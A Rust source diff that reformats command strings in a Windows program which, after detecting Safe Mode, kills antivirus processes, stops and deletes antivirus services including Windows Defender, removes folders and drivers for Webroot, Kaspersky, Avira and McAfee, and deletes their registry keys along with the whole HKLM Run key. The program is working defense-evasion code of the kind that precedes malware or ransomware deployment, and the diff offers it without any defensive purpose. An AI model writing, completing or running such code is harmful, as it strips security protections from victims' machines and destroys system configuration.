@@ -372,172 +372,167 @@ fn main() -> io::Result<()> {
     if is_safe_mode() {
         println!("Safe Mode detected, proceeding with actions...");
 
-        // Declare a mutable vector to hold all the commands.
+        // Create a mutable vector to hold all commands.
         let mut commands: Vec<&str> = Vec::new();
 
         // Group 2: Cleanup Safe Mode setting
-        commands.push("bcdedit /deletevalue {current} safeboot");
+        commands.push(r#"bcdedit /deletevalue {current} safeboot"#);
 
         // Group 3: Webroot services and files cleanup
         let webroot_cmds = vec![
-            // Services to stop
-            "sc stop WRSkyClient",
-            "sc stop WRCoreService",
-            "sc stop WRSVC",
-            // Services to delete
-            "sc delete WRSkyClient",
-            "sc delete WRCoreService",
-            "sc delete WRSVC",
-            // Files to delete
-            "del /f /y \"%SystemRoot%\\System32\\Drivers\\wrkrn.sys\"",
-            "del /f /y \"%SystemRoot%\\System32\\wruser.dll\"",
-            // Folders to delete
-            "rd /s /q \"%ProgramFiles%\\Webroot\"",
-            "rd /s /q \"%ProgramFiles(x86)%\\Webroot\"",
-            "rd /s /q \"%ProgramData%\\WRCore\"",
-            "rd /s /q \"%ProgramData%\\WRData\"",
-            "rd /s /q \"%ProgramData%\\WRData\"",
-            "rd /s /q \"%ProgramFiles%\\Webroot\"",
-            "rd /s /q \"%ProgramFiles(x86)%\\Webroot\"",
-            "rd /s /q \"%ProgramData%\\WRCore\"",
+            // Stop services
+            r#"sc stop WRSkyClient"#,
+            r#"sc stop WRCoreService"#,
+            r#"sc stop WRSVC"#,
+            // Delete services
+            r#"sc delete WRSkyClient"#,
+            r#"sc delete WRCoreService"#,
+            r#"sc delete WRSVC"#,
+            // Delete files
+            r#"del /f /y "%SystemRoot%\System32\Drivers\wrkrn.sys""#,
+            r#"del /f /y "%SystemRoot%\System32\wruser.dll""#,
+            // Delete folders
+            r#"rd /s /q "%ProgramFiles%\Webroot""#,
+            r#"rd /s /q "%ProgramFiles(x86)%\Webroot""#,
+            r#"rd /s /q "%ProgramData%\WRCore""#,
+            r#"rd /s /q "%ProgramData%\WRData""#,
         ];
         commands.extend(webroot_cmds);
 
         // Group 4: Kaspersky directories cleanup 
         let kaspersky_dirs_cmds = vec![ 
-            "rd /s /q \"%ProgramData%\\Kaspersky Lab\"", 
-            "rd /s /q \"%ProgramFiles%\\Kaspersky Lab\"", 
-            "rd /s /q \"%ProgramFiles(x86)%\\Kaspersky Lab\"", 
+            r#"rd /s /q "%ProgramData%\Kaspersky Lab""#, 
+            r#"rd /s /q "%ProgramFiles%\Kaspersky Lab""#, 
+            r#"rd /s /q "%ProgramFiles(x86)%\Kaspersky Lab""#, 
         ];
-
         commands.extend(kaspersky_dirs_cmds);
 
         // Group 5: Avira directories cleanup
         let avira_dirs_cmds = vec![
-            "rd /s /q \"%ProgramFiles%\\Avira\"",
-            "rd /s /q \"%ProgramFiles(x86)%\\Avira\"",
-            "rd /s /q \"%ProgramData%\\Avira\"",
+            r#"rd /s /q "%ProgramFiles%\Avira""#,
+            r#"rd /s /q "%ProgramFiles(x86)%\Avira""#,
+            r#"rd /s /q "%ProgramData%\Avira""#,
         ];
         commands.extend(avira_dirs_cmds);
 
         // Group 6: McAfee directories cleanup
         let mcafee_dirs_cmds = vec![
-            "rd /s /q \"%ProgramData%\\McAfee\"",
-            "rd /s /q \"%ProgramFiles%\\McAfee\"",
-            "rd /s /q \"%ProgramFiles(x86)%\\McAfee\"",
+            r#"rd /s /q "%ProgramData%\McAfee""#,
+            r#"rd /s /q "%ProgramFiles%\McAfee""#,
+            r#"rd /s /q "%ProgramFiles(x86)%\McAfee""#,
         ];
         commands.extend(mcafee_dirs_cmds);
 
         // Group 7: Kill antivirus processes
         let kill_processes_cmds = vec![
-            "taskkill /F /IM AvastSvc.exe /T",
-            "taskkill /F /IM AvastUI.exe /T",
-            "taskkill /F /IM AvastWscReporter.exe /T",
-            "taskkill /F /IM aswVmm.exe /T",
-            "taskkill /F /IM MBAMService.exe /T",
-            "taskkill /F /IM MsMpEng.exe /T",
-            "taskkill /F /IM VSSERV.exe /T",
+            r#"taskkill /F /IM AvastSvc.exe /T"#,
+            r#"taskkill /F /IM AvastUI.exe /T"#,
+            r#"taskkill /F /IM AvastWscReporter.exe /T"#,
+            r#"taskkill /F /IM aswVmm.exe /T"#,
+            r#"taskkill /F /IM MBAMService.exe /T"#,
+            r#"taskkill /F /IM MsMpEng.exe /T"#,
+            r#"taskkill /F /IM VSSERV.exe /T"#,
         ];
         commands.extend(kill_processes_cmds);
 
         // Group 8: Stop antivirus services
         let stop_services_cmds = vec![
             // Avast
-            "sc stop \"AvastSvc\"",
-            "sc stop \"AvastWscReporter\"",
-            "sc stop \"aswVmm\"",
+            r#"sc stop "AvastSvc""#,
+            r#"sc stop "AvastWscReporter""#,
+            r#"sc stop "aswVmm""#,
             // Malwarebytes
-            "sc stop \"MBAMService\"",
+            r#"sc stop "MBAMService""#,
             // Windows Defender
-            "sc stop \"WinDefend\"",
-            "sc stop \"VSSERV\"",
-            //  McAfee
-            "sc stop \"McAfee Service Controller\"",
-            "sc stop \"McAfee Firewall Core Service\"",
-            "sc stop \"McAfee Validation Trust Protection\"",
+            r#"sc stop "WinDefend""#,
+            r#"sc stop "VSSERV""#,
+            // McAfee
+            r#"sc stop "McAfee Service Controller""#,
+            r#"sc stop "McAfee Firewall Core Service""#,
+            r#"sc stop "McAfee Validation Trust Protection""#,
         ];
         commands.extend(stop_services_cmds);
 
         // Group 9: Delete antivirus services
         let delete_services_cmds = vec![
             // Avast
-            "sc delete \"AvastSvc\"",
-            "sc delete \"AvastWscReporter\"",
-            "sc delete \"aswVmm\"",
+            r#"sc delete "AvastSvc""#,
+            r#"sc delete "AvastWscReporter""#,
+            r#"sc delete "aswVmm""#,
             // Malwarebytes
-            "sc delete \"MBAMService\"",
+            r#"sc delete "MBAMService""#,
             // Windows Defender
-            "sc delete \"WinDefend\"",
-            "sc delete \"VSSERV\"",
-            //  McAfee
-            "sc delete \"McAfee Service Controller\"",
-            "sc delete \"McAfee Firewall Core Service\"",
-            "sc delete \"McAfee Validation Trust Protection\"",
+            r#"sc delete "WinDefend""#,
+            r#"sc delete "VSSERV""#,
+            // McAfee
+            r#"sc delete "McAfee Service Controller""#,
+            r#"sc delete "McAfee Firewall Core Service""#,
+            r#"sc delete "McAfee Validation Trust Protection""#,
         ];
         commands.extend(delete_services_cmds);
 
         // Group 10: Delete registry keys for antivirus programs
         let delete_registry_cmds = vec![
             // Startup keys
-            "reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /f",
+            r#"reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f"#,
             // Avast-related keys
-            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\aswbIDSAgent\" /f",
-            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\aswbIDSAgent\" /f",
-            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\aswApPct\" /f",
-            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\aswApPct\" /f",
-            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\aswbidsdriver\" /f",
-            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\aswbidsdriver\" /f",
-            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\aswbidsh\" /f",
-            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\aswbidsh\" /f",
-            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\aswbuniv\" /f",
-            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\aswbuniv\" /f",
-            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\aswElam\" /f",
-            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\aswElam\" /f",
-            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\aswKbd\" /f",
-            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\aswKbd\" /f",
-            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\aswMonFit\" /f",
-            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\aswMonFit\" /f",
-            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\aswNetHub\" /f",
-            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\aswNetHub\" /f",
-            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\aswRdr\" /f",
-            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\aswRdr\" /f",
-            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\aswRvrt\" /f",
-            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\aswRvrt\" /f",
-            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\avast! Antivirus\" /f",
+            r#"reg delete "HKLM\SYSTEM\ControlSet001\Services\aswbIDSAgent" /f"#,
+            r#"reg delete "HKLM\SYSTEM\ControlSet002\Services\aswbIDSAgent" /f"#,
+            r#"reg delete "HKLM\SYSTEM\ControlSet001\Services\aswApPct" /f"#,
+            r#"reg delete "HKLM\SYSTEM\ControlSet002\Services\aswApPct" /f"#,
+            r#"reg delete "HKLM\SYSTEM\ControlSet001\Services\aswbidsdriver" /f"#,
+            r#"reg delete "HKLM\SYSTEM\ControlSet002\Services\aswbidsdriver" /f"#,
+            r#"reg delete "HKLM\SYSTEM\ControlSet001\Services\aswbidsh" /f"#,
+            r#"reg delete "HKLM\SYSTEM\ControlSet002\Services\aswbidsh" /f"#,
+            r#"reg delete "HKLM\SYSTEM\ControlSet001\Services\aswbuniv" /f"#,
+            r#"reg delete "HKLM\SYSTEM\ControlSet002\Services\aswbuniv" /f"#,
+            r#"reg delete "HKLM\SYSTEM\ControlSet001\Services\aswElam" /f"#,
+            r#"reg delete "HKLM\SYSTEM\ControlSet002\Services\aswElam" /f"#,
+            r#"reg delete "HKLM\SYSTEM\ControlSet001\Services\aswKbd" /f"#,
+            r#"reg delete "HKLM\SYSTEM\ControlSet002\Services\aswKbd" /f"#,
+            r#"reg delete "HKLM\SYSTEM\ControlSet001\Services\aswMonFit" /f"#,
+            r#"reg delete "HKLM\SYSTEM\ControlSet002\Services\aswMonFit" /f"#,
+            r#"reg delete "HKLM\SYSTEM\ControlSet001\Services\aswNetHub" /f"#,
+            r#"reg delete "HKLM\SYSTEM\ControlSet002\Services\aswNetHub" /f"#,
+            r#"reg delete "HKLM\SYSTEM\ControlSet001\Services\aswRdr" /f"#,
+            r#"reg delete "HKLM\SYSTEM\ControlSet002\Services\aswRdr" /f"#,
+            r#"reg delete "HKLM\SYSTEM\ControlSet001\Services\aswRvrt" /f"#,
+            r#"reg delete "HKLM\SYSTEM\ControlSet002\Services\aswRvrt" /f"#,
+            r#"reg delete "HKLM\SYSTEM\CurrentControlSet\Services\avast! Antivirus" /f"#,
             // Webroot keys
-            "reg delete \"HKLM\\SOFTWARE\\WOW6432Node\\Webroot\" /f",
-            "reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WRUNINST\" /f",
-            "reg delete \"HKLM\\SOFTWARE\\WRData\" /f",
-            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\services\\WRSVC\" /f",
-            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\services\\WRSVC\" /f",
-            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\services\\WRSVC\" /f",
+            r#"reg delete "HKLM\SOFTWARE\WOW6432Node\Webroot" /f"#,
+            r#"reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WRUNINST" /f"#,
+            r#"reg delete "HKLM\SOFTWARE\WRData" /f"#,
+            r#"reg delete "HKLM\SYSTEM\ControlSet001\services\WRSVC" /f"#,
+            r#"reg delete "HKLM\SYSTEM\ControlSet002\services\WRSVC" /f"#,
+            r#"reg delete "HKLM\SYSTEM\CurrentControlSet\services\WRSVC" /f"#,
             // Windows Defender keys
-            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinDefend\" /f",
-            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\WinDefend\" /f",
-            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\WinDefend\" /f",
+            r#"reg delete "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /f"#,
+            r#"reg delete "HKLM\SYSTEM\ControlSet001\Services\WinDefend" /f"#,
+            r#"reg delete "HKLM\SYSTEM\ControlSet002\Services\WinDefend" /f"#,
             // Kaspersky 21.3 keys
-            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\AVP21.3\" /f",
-            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\AVP21.3\" /f",
-            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\AVP21.3\" /f",
+            r#"reg delete "HKLM\SYSTEM\CurrentControlSet\Services\AVP21.3" /f"#,
+            r#"reg delete "HKLM\SYSTEM\ControlSet001\Services\AVP21.3" /f"#,
+            r#"reg delete "HKLM\SYSTEM\ControlSet002\Services\AVP21.3" /f"#,
             // Malwarebytes keys
-            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\MBAMService\" /f",
-            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\MBAMService\" /f",
-            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\MBAMService\" /f",
+            r#"reg delete "HKLM\SYSTEM\CurrentControlSet\Services\MBAMService" /f"#,
+            r#"reg delete "HKLM\SYSTEM\ControlSet001\Services\MBAMService" /f"#,
+            r#"reg delete "HKLM\SYSTEM\ControlSet002\Services\MBAMService" /f"#,
             // Bitdefender keys
-            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\VSSERV\" /f",
-            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\VSSERV\" /f",
-            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\VSSERV\" /f",
+            r#"reg delete "HKLM\SYSTEM\CurrentControlSet\Services\VSSERV" /f"#,
+            r#"reg delete "HKLM\SYSTEM\ControlSet001\Services\VSSERV" /f"#,
+            r#"reg delete "HKLM\SYSTEM\ControlSet002\Services\VSSERV" /f"#,
             // ESET keys
-            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\eamonm\" /f",
-            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\edevmon\" /f",
-            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\ehdrv\" /f",
-            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\ekbdflt\" /f",
-            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\ekrn\" /f",
-            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\epfw\" /f",
-            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\epfwwfp\" /f",
-            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\ESETCleanersDriver\" /f",
+            r#"reg delete "HKLM\SYSTEM\CurrentControlSet\Services\eamonm" /f"#,
+            r#"reg delete "HKLM\SYSTEM\CurrentControlSet\Services\edevmon" /f"#,
+            r#"reg delete "HKLM\SYSTEM\CurrentControlSet\Services\ehdrv" /f"#,
+            r#"reg delete "HKLM\SYSTEM\CurrentControlSet\Services\ekbdflt" /f"#,
+            r#"reg delete "HKLM\SYSTEM\CurrentControlSet\Services\ekrn" /f"#,
+            r#"reg delete "HKLM\SYSTEM\CurrentControlSet\Services\epfw" /f"#,
+            r#"reg delete "HKLM\SYSTEM\CurrentControlSet\Services\epfwwfp" /f"#,
+            r#"reg delete "HKLM\SYSTEM\CurrentControlSet\Services\ESETCleanersDriver" /f"#,
             // Avira key
-            "reg delete HKLM\\SOFTWARE\\AVIRA /f",
+            r#"reg delete HKLM\SOFTWARE\AVIRA /f"#,
         ];
         commands.extend(delete_registry_cmds);
 
@@ -553,10 +548,10 @@ fn main() -> io::Result<()> {
         
         // Modify registry for explorer.exe
         if let Err(e) = modify_registry() {
-            eprintln!("Error removing antivirus folder: {}", e);
+            eprintln!("Error modifying registry: {}", e);
         }
 
-        // Remove antivirus folders from Program Files, Program Files (x86) and Program Data
+        // Remove antivirus folders from Program Files, Program Files (x86), and Program Data directories
         println!("Starting scan for antivirus software...");
 
         // Retrieve system directories from environment variables.
